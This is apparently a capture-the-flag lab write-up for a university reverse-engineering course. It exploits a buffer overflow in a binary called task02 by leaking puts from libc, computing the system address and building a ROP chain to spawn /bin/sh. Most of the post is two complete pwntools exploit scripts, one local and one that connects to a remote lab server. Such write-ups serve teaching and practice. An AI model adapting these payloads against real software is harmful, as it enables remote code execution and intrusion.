---
layout: post
title:  UNIBUC_RE_lab_6_task_2
image: /assets/img/UNIBUC_RE.jpg
date:   2022-09-01 16:39:01
tags:
- pwn
description: ROP challenge with address leak for calling system
categories:
- UNIBUC RE
---

ROP challenge with address leak for calling system

The vulnerability is a buffer overflow here:
![](/assets/img/2022-09-02-12-38-17.png)
The libc leak is here:
![](/assets/img/2022-09-02-12-38-40.png)
Same stack setup as previous one:
![](/assets/img/2022-09-02-12-39-41.png)

```
pwndbg> p puts
$1 = {int (const char *)} 0x7fe5836cd690 <_IO_puts>
pwndbg> p system
$2 = {int (const char *)} 0x7fe5836a3390 <__libc_system>
```
we compute offset and then we make our payload:
System call is 0x2A300 earlier than puts


```
from pwn import *

from ctypes import *
e = ELF('./task02')
pop_rdi=0x40129b
bin_sh=0x40302a

io = process("./task02",env={"LD_PRELOAD" : "./libc.so"})
io.recvuntil("name")
gdb.attach(io,'break *0x40121C  ')
io.sendline(128*b'a'+8*b'x'+p64(e.symbols['leaky_function'])+p64(e.symbols['main']))
temp_recv=io.recvuntil('Puts is at address')
puts_address=int(io.recvline(),16)
print(hex(puts_address))
print('puts end ----')
system_address=puts_address-0x2a300
io.sendline(128*b'a'+8*b'x'+p64(pop_rdi)+p64(bin_sh)+ p64(system_address))


io.interactive()

```

![](/assets/img/2022-09-02-13-00-38.png)


remote connecting script:

```
from pwn import *

from ctypes import *
e = ELF('./task02')
pop_rdi=0x40129b
bin_sh=0x40302a


#io = process("./task02",env={"LD_PRELOAD" : "./libc.so"})
io=remote('45.76.91.112',10062)
io.recvuntil("name")
#gdb.attach(io,'break *0x40121C  ')
io.sendline(128*b'a'+8*b'x'+p64(e.symbols['leaky_function'])+p64(e.symbols['main']))
temp_recv=io.recvuntil('Puts is at address')
puts_address=int(io.recvline(),16)
print(hex(puts_address))
print('puts end ----')
system_address=puts_address-0x2a300
io.sendline(128*b'a'+8*b'x'+p64(pop_rdi)+p64(bin_sh)+ p64(system_address))


io.interactive()

```
